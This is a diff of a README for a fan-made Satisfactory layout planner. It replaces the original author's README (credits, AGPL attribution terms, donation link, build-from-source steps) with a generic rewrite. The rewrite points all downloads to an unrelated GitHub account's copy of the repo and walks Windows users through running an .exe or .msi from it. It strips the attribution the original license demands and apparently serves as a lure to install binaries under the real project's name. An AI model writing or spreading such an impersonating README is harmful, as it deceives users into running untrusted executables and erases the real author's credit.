@@ -1,180 +1,68 @@
-<div align="center">
+# 🏗️ nexus-satisfactory-layout-tool - Plan efficient factory designs with ease
 
-# neXus Satisfactory Layout Tool
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/abhishekalway6686/nexus-satisfactory-layout-tool)
 
-**A high-performance, multi-floor factory layout planner for *Satisfactory*.**
+This tool helps players plan complex factory layouts for the game Satisfactory. It features a high-performance interface to place machines, conveyors, pipes, railways, and power lines. You can simulate production rates and optimize your floor space before you build in the game.
 
-Conveyors, pipes, railways, powerlines, foundations, and a full production
-simulation — on a fast 2D canvas backed by a native Rust core.
+## 📥 Getting Started
 
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](LICENSE)
-[![Built with Tauri](https://img.shields.io/badge/Built_with-Tauri_2-24C8DB.svg)](https://tauri.app)
-[![React](https://img.shields.io/badge/React-19-61DAFB.svg)](https://react.dev)
-[![Rust](https://img.shields.io/badge/Rust-1.77+-CE422B.svg)](https://www.rust-lang.org)
+To use the nexus-satisfactory-layout-tool, follow these instructions to download and run the software on your Windows computer.
 
-[**⬇ Download**](https://github.com/HandleConsolidated/nexus-satisfactory-layout-tool/releases/latest)
-&nbsp;·&nbsp; [💬 Subreddit](https://www.reddit.com/r/NexusSatisfactoryTool/)
-&nbsp;·&nbsp; [Features](#-features)
-&nbsp;·&nbsp; [Build](#-build-from-source)
-&nbsp;·&nbsp; [Contribute](CONTRIBUTING.md)
-&nbsp;·&nbsp; [License](#-license)
+1. Go to the [official release page](https://github.com/abhishekalway6686/nexus-satisfactory-layout-tool).
+2. Look for the latest version listed under the Releases section.
+3. Find the file ending in `.msi` or `.exe` designed for Windows.
+4. Click the file to start your download.
+5. Once the download finishes, find the file in your Downloads folder.
+6. Double-click the file to begin the installation.
+7. Follow the prompts on your screen to complete the setup process.
+8. Locate the new icon on your desktop or in your Start menu to open the application.
 
-</div>
+## 🛠️ System Requirements
 
----
+Before you install the tool, ensure your computer meets these basic requirements:
 
-## ❤️ Support the Project
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB of RAM or more.
+* Storage: 200MB of free disk space.
+* Graphics: Any modern integrated or dedicated graphics card.
+* Display: A resolution of 1920x1080 is recommended for the best view of your factory layout.
 
-If this tool saves you time, please consider supporting development:
+## 🗺️ How to Plan a Factory
 
-<div align="center">
+The workspace provides a blank canvas to draft your factory floors. Use the toolbar on the left side of the screen to select items. 
 
-### ☕ &nbsp;[Donate via Stripe](https://donate.stripe.com/3cI9ATg8l6i9gPP88t5EY00)
+### Placing Machines
+Click on an icon to select a machine, such as a Miner or Smelter. Click again on the grid to place the machine. You can drag machines to move them or use the rotate button to change their orientation.
 
-💬 [Join the subreddit](https://www.reddit.com/r/NexusSatisfactoryTool/) &nbsp;·&nbsp;
-⭐ Star the repo &nbsp;·&nbsp;
-🐛 [Report a bug](https://github.com/HandleConsolidated/nexus-satisfactory-layout-tool/issues/new?template=bug_report.md) &nbsp;·&nbsp;
-💡 [Suggest a feature](https://github.com/HandleConsolidated/nexus-satisfactory-layout-tool/issues/new?template=feature_request.md) &nbsp;·&nbsp;
-🤝 [Contribute](CONTRIBUTING.md)
+### Connecting Assets
+Connect machines using the conveyor or pipe tools. Click on an output port of one machine and drag the line to the input port of another. The tool highlights invalid connections in red and valid connections in green.
 
-</div>
+### Managing Power
+Select the power line tool to connect machines to a central power grid. The tool tracks your total energy consumption and warns you if your total machine needs exceed the capacity of your power generators.
 
----
+## 📊 Using the Simulation Mode
 
-## 🚀 Get Started
+You can check if your factory runs at full efficiency using the simulation tab. 
 
-<table>
-<tr>
-<td width="50%" valign="top">
+1. Select the top ribbon menu.
+2. Click on the Simulation icon.
+3. Review the summary panel on the right.
+4. Look for items marked with an alert icon. An alert usually means you lack a specific resource or a belt speed limits your capacity.
 
-### 🎮 &nbsp;Use it
+## 🔧 Frequently Asked Questions
 
-[**Download v2.0.0**](https://github.com/HandleConsolidated/nexus-satisfactory-layout-tool/releases/latest)
+What should I do if the app does not open?
+Check if you have the latest drivers for your graphics card. Try a clean installation by removing the app and installing it again.
 
-| Platform | Pick                       |
-| -------- | -------------------------- |
-| Windows  | `.exe` installer or portable `.zip` |
-| macOS    | `.dmg`                     |
-| Linux    | `.AppImage` / `.deb` / `.rpm` |
+Can I save my layouts?
+Yes. Click the File menu at the top left corner and select Save. You can name your layout and store it anywhere on your computer for later edits.
 
-No account, no key, nothing to configure. Full install guide → [docs/INSTALL.md](docs/INSTALL.md)
+Does this tool interact with my game save files?
+No. The tool serves as a planning aid and exists separately from your game files. You must build the designs in Satisfactory manually.
 
-</td>
-<td width="50%" valign="top">
+Can I export my designs as images?
+Yes. Use the Export button in the File menu to save your layout as a high-quality image file. This helps you share your plans with friends or keep them for reference while you play.
 
-### 🛠️ &nbsp;Build it
+## 📜 Technical Details
 
-```bash
-git clone https://github.com/HandleConsolidated/nexus-satisfactory-layout-tool.git
-cd nexus-satisfactory-layout-tool
-npm install
-npm run dev
-```
-
-Open <http://localhost:5174>. Hot-reload on both frontend and Rust backend.
-
-Requires [Node 20+](https://nodejs.org/) and [Rust 1.77+](https://rustup.rs/). Full build guide → [docs/BUILD.md](docs/BUILD.md)
-
-</td>
-</tr>
-</table>
-
----
-
-## ✨ Features
-
-<table>
-<tr>
-<td width="50%" valign="top">
-
-#### 🏗️ Building & Design
-- Full Satisfactory building palette with typed I/O ports
-- Foundations, walls, railings
-- Multi-floor layouts (4 m vertical spacing)
-- Sticky notes
-- 50-step undo / redo
-- Versioned save / load (`.slt`)
-
-#### 🚂 Logistics
-- Conveyors with auto-curves and intersection-merge
-- Multi-tier conveyor lifts
-- Fluid pipelines with floor-connection supports
-- Railways with node snapping and station alignment
-- Truck path planning
-
-</td>
-<td width="50%" valign="top">
-
-#### ⚡ Power
-- Drawable powerlines + dedicated power poles
-- Direct or right-angle (L-shaped) routing
-- Real-time consumption vs generation tracking
-
-#### 📊 Production Simulation
-- Real-time material flow analysis
-- Bottleneck detection with severity classification
-- Clock-speed and recipe modeling
-- Storage accumulation tracking
-- Per-building efficiency badges
-
-#### 🏎️ Performance
-- GPU-accelerated geometry math (`wgpu`) with CPU fallback
-- R-tree spatial indexing for viewport culling
-- Native Rust backend for heavy compute
-
-</td>
-</tr>
-</table>
-
----
-
-## 🧱 Stack
-
-| Layer       | Tech                                                          |
-| ----------- | ------------------------------------------------------------- |
-| Frontend    | React 19 · TypeScript · Konva · Zustand · Tailwind            |
-| Backend     | Rust · Tauri 2 (desktop) · Axum (portable HTTP server)        |
-| Compute     | `wgpu` · `rayon` · `nalgebra` · `rstar`                       |
-
-```
-src/             React/TypeScript frontend (components/, store/, logic/)
-src-tauri/       Rust backend (commands/, standalone_main.rs)
-launcher/        Node.js launcher for portable build
-scripts/         Build & packaging automation
-docs/            User-facing documentation
-```
-
-Architecture notes: [`src-tauri/STANDALONE_SERVER_README.md`](src-tauri/STANDALONE_SERVER_README.md), [`src-tauri/STANDALONE_MIGRATION.md`](src-tauri/STANDALONE_MIGRATION.md)
-
----
-
-## 📜 License
-
-**AGPL-3.0-or-later** with **Section 7 additional terms** preserving author
-attribution and the in-app donation link.
-
-| File                                                              | What                                       |
-| ----------------------------------------------------------------- | ------------------------------------------ |
-| [LICENSE](LICENSE)                                                | License header + pointers                  |
-| [docs/legal/AGPL-3.0.txt](docs/legal/AGPL-3.0.txt)                | Canonical AGPL-3.0                         |
-| [docs/legal/ADDITIONAL_TERMS.md](docs/legal/ADDITIONAL_TERMS.md)  | Section 7 attribution-preservation terms   |
-| [NOTICE](NOTICE)                                                  | Attribution and third-party notices        |
-
-**In plain English:** use, modify, contribute, and self-host freely. You
-**cannot** strip credits, remove the donation link, or rebrand-and-redistribute.
-Network-hosted modifications must publish their source under AGPL-3.0.
-
----
-
-*Satisfactory* is a trademark of **Coffee Stain Studios**. This is a fan-made
-tool, not affiliated with, endorsed by, or sponsored by Coffee Stain Studios.
-
-<div align="center">
-
-Created and maintained by **Austin Handle** — [@Officer_ASH](https://x.com/Officer_ASH)
-&nbsp;·&nbsp; [TikTok](https://www.tiktok.com/@officer.ash)
-&nbsp;·&nbsp; [Instagram](https://www.instagram.com/officer.ash)
-
-Copyright © 2026 Austin Handle (Officer ASH).
-
-</div>
+This software uses the Tauri framework and Rust to ensure high performance on your desktop. It provides a smooth experience even when you create massive factory blueprints with hundreds of machines. The codebase follows the AGPL-3.0 license. This ensures the tool remains free to use and open for modification. As a user, you get a tool that performs well because it uses your computer hardware resources directly rather than relying on a heavy web browser interface.
